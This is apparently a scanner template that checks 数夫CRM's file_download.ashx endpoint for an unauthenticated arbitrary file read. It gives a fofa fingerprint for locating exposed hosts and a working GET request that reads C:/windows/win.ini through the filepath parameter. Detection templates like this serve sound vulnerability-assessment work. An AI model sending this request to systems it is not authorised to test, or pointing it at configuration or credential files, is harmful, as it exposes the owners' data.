id: shufu-crm-file-download-fileread

info:
  name: 数夫CRM客户关系管理系统 file_download.ashx 任意文件读取漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    数夫CRM客户关系管理系统  file_download.ashx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    fofa：icon_hash="-244202779"
  reference:
    - https://cn-sec.com/archives/4364656.html
  tags: CRM,readfile
  created: 2025/08/13

set:
  hostname: request.url.host

rules:
  r0:
    request:
      method: GET
      path: /Web/common/Handler/file_download.ashx?filepath=C:/windows/win.ini
    expression: >-
      response.status == 200 && "[fonts]".bmatches(response.body) && "[extensions]".bmatches(response.body)

expression: r0()
